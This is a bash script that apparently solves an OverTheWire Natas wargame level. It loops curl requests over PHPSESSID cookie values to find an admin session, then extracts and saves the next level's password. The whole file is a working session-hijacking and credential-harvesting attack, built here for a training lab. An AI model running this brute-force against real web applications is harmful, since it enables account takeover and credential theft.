#!/bin/bash

user="natas18" 
url="http://$user.natas.labs.overthewire.org" 
pass=$(cat credentials/natas18)

normalUserBody="You are logged in as a regular user. Login as an admin to retrieve credentials"
echo "[*] Trying with PHPSESSID cookie value from 100 to 600 value"

for i in {100..600}; do
  echo "[*] Send request with cookie PHPSESSID=$i"
  response=$(curl -s --cookie "PHPSESSID=$i" -u "$user:$pass" "$url" | html2text)
  if [[ "$response" != *"$normalUserBody"* ]]; then
    echo "Admin cookie: $i"
    natas19Password=$(echo "$response" | grep "Password" | awk '{print $2}')
    echo "$response"
    echo -e \n"Password found for natas19: $natas19Password"
    echo "$natas19Password" > credentials/natas19
    break
  fi  
done

